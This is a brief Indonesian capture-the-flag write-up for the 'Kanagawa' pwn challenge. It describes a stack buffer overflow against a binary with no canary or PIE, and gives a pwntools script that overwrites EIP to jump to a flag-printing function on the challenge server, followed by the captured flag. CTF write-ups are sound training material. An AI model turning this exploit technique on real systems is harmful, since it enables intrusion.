# Kanagawa
---
nc challs.dvc.tf 4444 or nc challs.dvc.tf 7777
# Solver
---
Diberikan binary file. Pertama yang saya lakukan adalah mengunakan tool ```checksec``` ternyata tidak ada canary dan tidak ada PIE juga. Yaudah saya cek dulu menggunakan ```objdump``` untuk mengetahui fungsi yang ada ternyata ada fungsi ```0804851b <recovery_mode>``` yang berisikan cat flag. Hmmmm punya ide buat nge overflow lalu ```EIP``` pada program saya arahkan ke fungsi ```recovery_mode```. Begini kodingan saya hehehe
```
from pwn import *
program = ELF("./kanagawa")
pattern = "A"*cyclic_find("kaaa")
flag = p32(0x0804851b)
p = process("./kanagawa")
p = remote("challs.dvc.tf",4444)
#raw_input("Gdb gan")
p.recvuntil("Email: ")
p.sendline(pattern + flag)

p.interactive()

```
Dan dapat flagnya
#### dvCTF{0v3rfl0w_tsun4m1}
